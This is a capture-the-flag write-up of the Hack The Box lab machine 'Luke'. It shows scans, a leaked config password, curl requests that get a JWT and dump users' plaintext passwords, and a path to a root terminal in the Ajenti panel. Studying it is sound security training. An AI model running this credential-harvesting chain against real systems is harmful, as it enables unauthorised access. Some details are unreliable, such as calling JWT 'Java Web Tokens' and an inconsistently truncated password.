---
layout: single
title: Luke - Hack The Box
excerpt: "Luke is pretty straightforward... TODO: Summarize better"
date: 2019-05-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-luke/luke_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ftp
  - php
  - ajenti
  - json
  - jwt
---

![](/assets/images/htb-writeup-luke/luke_logo.png)

TODO: mirror excerpt here

## TLDR

- When you look at the anonymous ftp login, you can see a for_Chiro.txt saying you need the source file for the web app. 
- By using the `.phps` file extension we can get the config web application and some credentials
- The credentials are used to authenticate to the API app on port 3000
- We can list the users and their plaintext passwords on port 3000
- The `/management` URI is protected with basic HTTP auth and we can log in with one of the user found with the API
- Root password is contained in `config.json` file
- Use the root password to log on to the Ajenti admin panel


### Scans Away

As always, we start out with the basics! Let's run a quick TCP scan and save the results to the 
nmap folder for later reference.

```commandline
root@kali:~/htb/machines/luke# nmap -sC -sV -oA nmap/quickscan 10.10.10.137                      	 
Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-05-27 13:26 ADT                              
Nmap scan report for 10.10.10.137
Host is up (0.14s latency).
Not shown: 995 closed ports
PORT 	STATE SERVICE VERSION
21/tcp   open  ftp 	vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x	2 0    	0         	512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|  	Connected to 10.10.14.21
|  	Logged in as ftp
|  	TYPE: ASCII
|  	No session upload bandwidth limit
|  	No session download bandwidth limit
|  	Session timeout in seconds is 300
|  	Control connection is plain text
|  	Data connections will be plain text
|  	At session startup, client count was 1
|  	vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http	Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Luke
3000/tcp open  http	Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http	Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   	 
Nmap done: 1 IP address (1 host up) scanned in 203.21 seconds

```

### FTP enumeration

The FTP server here allows anonymous logins, it contains a folder called `webapp` with a file called for_Chihiro.txt… cannot upload files here and `for_Chihiro.txt` 
does not appear to be visible on any web server (80,3000, or 8000)



####for_Chiro.txt
```
As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

### Port 80 - Website enumeration

I learned an important lesson on this challenge… don’t always rely on a single tool! I used the following command 

```commandline
root@kali:~/htb/machines/luke# gobuster -u http://10.10.10.137 -w /usr/share/dirb/wordlists/common.txt -x php

config.php (Status: 200)
/member
/vendor
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/LICENSE (Status: 200)
/login.php (Status: 200)
/member (Status: 301)
/vendor (Status: 301)
```
Config.php has a username and password for what appears to be a MySQL Database

```php

$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 

```
With that, I thought I had a full list of what’s available on port 80! I did not because I did 
not realize that gobuster ignores HTTP 401 responses. Turns out there is another URI that we 
need to find, that does return 401 (Unauthorized). I did not find this myself… someone had to 
point me in the right direction… but here’s a command you can run using wfuzz to find 
everything that responds without 404

```commandline

root@kali:~/htb/machines/luke# wfuzz -w /usr/share/dirb/wordlists/common.txt --hc 404 http://10.10.10.13
7/FUZZ                                                                                             	 
                                                                                                   	 
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites.
Check Wfuzz's documentation for more information.                                                  	 
                                                                                                   	 
********************************************************                                           	 
* Wfuzz 2.3.4 - The Web Fuzzer                     	*                                           	 
********************************************************                                          	 

Target: http://10.10.10.137/FUZZ
Total requests: 4614

==================================================================                                	 
ID   Response   Lines  	Word     	Chars      	Payload                                    	 
==================================================================                                	 

000001:  C=200	108 L  	240 W     	3138 Ch    	""                                     
000011:  C=403  	9 L   	24 W      	213 Ch    	".hta"                                 
000012:  C=403  	9 L   	24 W      	218 Ch    	".htaccess"                             
000013:  C=403  	9 L   	24 W      	218 Ch    	".htpasswd"                             
001114:  C=301  	7 L   	20 W      	232 Ch    	"css"                                   
002020:  C=200	108 L  	240 W     	3138 Ch    	"index.html"                            
002179:  C=301  	7 L   	20 W      	231 Ch    	"js"                                    
002282:  C=200 	21 L  	172 W     	1093 Ch    	"LICENSE"                               
002435:  C=401 	12 L   	46 W      	381 Ch    	"management" 
002485:  C=301  	7 L   	20 W      	235 Ch    	"member"
004286:  C=301  	7 L   	20 W      	235 Ch    	"vendor"

Total time: 66.99591
Processed Requests: 4614
Filtered Requests: 4603
Requests/sec.: 68.86986

```

__ALTERNATIVELY__

You can use the -s parameter to gobuster to include a whitelist of status codes you want it to report by adding: -s 401,300,301,500,200

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x php -u http://10.10.10.137

/LICENSE (Status: 200)
/config.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/login.php (Status: 200)
/management (Status: 401)
/member (Status: 301)
/vendor (Status: 301)
=====================================================
2019/05/26 16:38:20 Finished
=====================================================
```

That `/management` URI will come in handy. It prompts us for credentials, but the one’s we have do not work here.

`/login.php` is a login page for a PHP web application.

### Port 3000 - NodeJS app

The application running on port 3000 expects a JWT token in the Authorization header. 

Ran gobuster on this with following:
```commandline
root@kali:~/htb/machines/luke# gobuster -u http://10.10.10.137:3000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
Results:
* http://luke.htb:3000/login - Says “Please Auth”
* http://luke.htb:3000/users (asks for Auth Token)

This is where we learn about JWT tokens (Java Web Tokens). We can submit the credentials we 
found in config.php to create a Token, which can be used as an authorization header in 
subsequent requests. Tried this with username and password we found in config.php, 
but that did not work… again I had a nudge from an outsider to try a variety of usernames… 
and I found that using `admin` as the username worked flawlessly

```commandline
root@kali:~/htb/machines/luke# curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://luke.htb:3000/login
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08"}
```

Now we can take this JWT Token and add it to our request to /users, which will then work as follows
```commandline
root@kali:~/htb/machines/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08' http://luke.htb:3000/users
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

So we found 4 users!!!
* Admin
* Derry
* Yuri
* Dory

We can get details on each one by issuing commands to ``http://luke.htb:3000/users/[username]`` as follows

```commandline
curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08' http://luke.htb:3000/users/Derry
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}

root@kali:~/htb/machines/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08' http://luke.htb:3000/users/Yuri
{"name":"Yuri","password":"bet@tester87"}

root@kali:~/htb/machines/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08' http://luke.htb:3000/users/Dory
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}

root@kali:~/htb/machines/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4OTg1NjQ0LCJleHAiOjE1NTkwNzIwNDR9.jEiJ78GrGYiU-w6xxKA7sh_pJ0AI847byB_Q3LLvP08' http://luke.htb:3000/users/Admin
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
```
###Credential Found

* Admin - WX5b7)>/rp$U)FW
* Derry - rZ86wwLvx7jUxtch
* Yuri - bet@tester87
* Dory - 5y:!xa=ybfe

Enumeration finally uncovers /management on port 80, which is realm based authentication

Use Derry’s credentials: Derry:rZ86wwLvx7jUxtch

http://luke.htb/management/

Shows a listing of files, including config.json!

Config.json has a user called root with a password of KpMasng6S5EtTy9Z!
* root - KpMasng6S5EtTy9Z

Let’s use this to log in to port 8000

We're now logged into the Ajenti web application. There is a terminal tool in the left navigation 
panel. Click that and we are root!

```commandline
# whoami
root                                                                                                                                                           

# cat /root/root.txt
********************************

# cat /home/derry/user.txt
********************************                                                                                                                                   
```